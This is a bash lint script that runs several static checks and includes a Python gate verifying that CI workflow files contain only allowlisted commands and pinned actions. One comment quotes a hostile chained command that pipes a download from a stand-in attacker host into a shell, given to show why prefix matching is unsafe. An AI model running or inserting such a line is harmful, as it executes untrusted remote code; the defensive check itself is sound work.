#!/usr/bin/env bash
# Every static gate, in one pass.
#
#   scripts/lint.sh          check
#   scripts/lint.sh --fix    apply what ruff can fix, then check the rest
#
# **Runs all six and reports all six.** `just`'s recipe dependencies are
# fail-fast, which is right for a pipeline and wrong for a developer: someone who
# has just touched Python, a shell script and the Containerfile wants three
# verdicts, not the first one. So this accumulates rather than &&-chaining, and
# the summary at the end is the thing to read.

# shellcheck source=scripts/lib.sh
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

failed=()
gate() {
    local name="$1"; shift
    if "$@"; then
        printf '  ok    %s\n' "$name"
    else
        printf '  FAIL  %s\n' "$name"
        failed+=("$name")
    fi
}

# `.github/` must hold no logic, so that deleting it at the GitLab migration
# loses nothing. Asserting that is cheaper than intending it: this repo's own
# view is that a claim nothing checks is a claim that drifts.
#
# Parsed rather than grepped. A GitLab job puts its commands in a list *under*
# `script:`, so a line-oriented check would only ever see the `script:` key and
# would pass while the commands beneath it did anything at all.
#
# It also reads `uses:`, because ci.yml's own header claims "No third-party
# actions" and nothing asserted it. The claim now has a gate, and so does the
# digest pinning: a tag ref is what a marketplace action's argument is actually
# about, and an unpinned ref is the same mutable-tag exposure whoever publishes
# it.
workflows_carry_no_logic() {
    "$PY" - "$REPO" <<'PY'
import sys, re, pathlib, yaml

repo = pathlib.Path(sys.argv[1])
# `just <recipe>`, plus the two bootstrap scripts that must run before `just`
# exists on a fresh runner: os-deps.sh brings curl and unzip, install-tools.sh
# brings just itself.
#
# The whole command, not its prefix. A prefix test passes
# `just check && curl evil.sh | sh`, which is logic in a workflow by any reading
# -- the same weakness this repo already records in settings.json's deny
# matcher, which is a prefix and not a pattern. Anchoring both ends rejects
# every chaining form at once instead of blocklisting operators one at a time.
ok = re.compile(r"just [a-z][a-z-]*|\./scripts/(os-deps|install-tools)\.sh")
# First-party owner and a 40-hex commit, which is what a digest pin looks like
# for an action. `actions/checkout@v7` is a mutable tag: the ref moves, the
# runner runs whatever it moved to.
uses_ok = re.compile(r"actions/[a-z-]+@[0-9a-f]{40}")
bad = []

def lines(value):
    """Every command string under one `script:`, however deeply YAML nests it.

    A sequence alias splices a *list* into the list: `- *bootstrap` under
    `script:` parses to `[[...three commands...], "just check"]`, not to four
    strings. Matching only `isinstance(item, str)` therefore drops the whole
    anchor with no diagnostic, which is the shape all four GitLab jobs use.
    """
    if isinstance(value, str):
        yield from value.strip().splitlines()
    elif isinstance(value, list):
        for item in value:
            yield from lines(item)


def commands(node):
    """Every shell command in a workflow, from either platform's shape."""
    if isinstance(node, dict):
        for key, value in node.items():
            if key in ("run", "script", "before_script", "after_script"):
                yield from lines(value)
            else:
                yield from commands(value)
    elif isinstance(node, list):
        for item in node:
            yield from commands(item)


def uses(node):
    """Every action a workflow runs."""
    if isinstance(node, dict):
        for key, value in node.items():
            if key == "uses" and isinstance(value, str):
                yield value
            else:
                yield from uses(value)
    elif isinstance(node, list):
        for item in node:
            yield from uses(item)


# Both extensions: GitHub reads either, so a check that reads only one fails
# open on a file it was written to cover.
workflows = repo / ".github" / "workflows"
files = sorted(workflows.glob("*.yml")) + sorted(workflows.glob("*.yaml"))
gitlab = repo / ".gitlab-ci.yml"
if gitlab.is_file():
    files.append(gitlab)

for path in files:
    document = yaml.safe_load(path.read_text())
    for command in commands(document):
        command = command.strip()
        if command and not ok.fullmatch(command):
            bad.append(f"{path.name}: {command}")
    for action in uses(document):
        if not uses_ok.fullmatch(action.strip()):
            bad.append(f"{path.name}: uses {action.strip()}")

if bad:
    print("\n".join(f"        {b}" for b in bad), file=sys.stderr)
    sys.exit(1)
PY
}

main() {
    local ruff="$REPO/.venv/bin/ruff"
    need_venv

    if [ "${1:-}" = "--fix" ]; then
        "$ruff" check --fix "$REPO"
        "$ruff" format "$REPO"
    fi

    log "lint"
    gate "ruff check"        "$ruff" check "$REPO"
    gate "ruff format"       "$ruff" format --check "$REPO"
    # Two ignores, and only one of them is a false positive.
    #
    # Each names the instruction it covers, not the line. A line number in this
    # file pointing into that one goes stale on every edit above the target, and
    # hadolint already prints the line: these read :82, :94, :108 and :149, and
    # one 35-line comment added to the Containerfile put all four out by 36
    # without touching any of the instructions they describe.
    #
    # DL4006 wants pipefail before a piped RUN. Both pipes verify a download --
    # the tofu RPM and the provider zip -- and both are
    # `echo "$SHA  file" | sha256sum -c -`, where echo cannot fail. False
    # positive.
    #
    # DL3041, on the `dnf -y install` of the runtime closure, is **not** a false
    # positive: it really is unpinned, and that is why two builds of the same
    # commit differ. The project's answer is archival rather than pinning --
    # manifest.json records the exact version and licence of all ~161 packages
    # that shipped -- with the monthly rebuild-and-scan as the control that
    # notices when the drift starts mattering. Pinning six names here would not
    # make the closure reproducible and would break on the first Rocky update.
    # Ignored knowingly, not silently.
    gate "hadolint"          hadolint --ignore DL4006 --ignore DL3041 "$REPO/Containerfile"
    gate "tofu fmt"          tofu fmt -check -recursive "$REPO"
    # -x follows `source lib.sh`, so a variable used only by a caller is not
    # reported unused and a genuinely unused one still is.
    #
    # .claude/hooks/ is in here because its scripts are shell this repo ships and
    # CI would otherwise never read them. They are agent configuration rather
    # than pipeline code, but this project's position is that a claim nothing
    # checks is a claim that drifts, and that does not stop being true because
    # the file is small. Both globs always match; no nullglob handling needed.
    #
    # **Four of shellcheck's nine optional checks, and the flags rather than a
    # .shellcheckrc.** A config file is found by searching upward from each input
    # and is silently ignored when it is not found or when it names a check the
    # running shellcheck does not know; an unknown `-o` name here exits non-zero
    # and fails this gate instead. The EPEL shellcheck on the maintainer's box
    # (0.10.0) is newer than the one os-deps.sh installs from apt on ubuntu:24.04,
    # so that difference is real and has to fail loudly. conftest.py:7: a gate
    # that quietly passes because it did not run is worse than no gate.
    #
    # Measured over these same two globs before enabling, ~1160 lines:
    # check-unassigned-uppercase 0, quote-safe-variables 0,
    # avoid-nullary-conditions 0, check-extra-masked-returns 9.
    #
    # The nine were fixed rather than suppressed. Two were real: lib.sh's
    # `git status` inside `[ -n "$(...)" ]`, which recorded a clean SHA for a
    # dirty tree when git failed, and image-build.sh's `now_utc` inline in
    # --build-arg, which shipped an empty BUILD_DATE label. Both now assign on
    # their own line, where `set -e` sees the failure. The other seven are du,
    # jq, basename and id inside log lines and die messages, and carry `|| true`.
    #
    # `require-variable-braces` is the fifth check the survey proposed and is
    # deliberately out: 293 findings, every one a mechanical $var -> ${var} with
    # no correctness content, which would have buried the nine above.
    gate "shellcheck"        shellcheck -x -s bash \
                                 -o check-extra-masked-returns \
                                 -o check-unassigned-uppercase \
                                 -o quote-safe-variables \
                                 -o avoid-nullary-conditions \
                                 "$REPO"/scripts/*.sh "$REPO"/.claude/hooks/*.sh
    gate "workflows carry no logic" workflows_carry_no_logic

    if [ ${#failed[@]} -gt 0 ]; then
        die "${#failed[@]} gate(s) failed: ${failed[*]}"
    fi
    log "all gates pass"
}

main "$@"
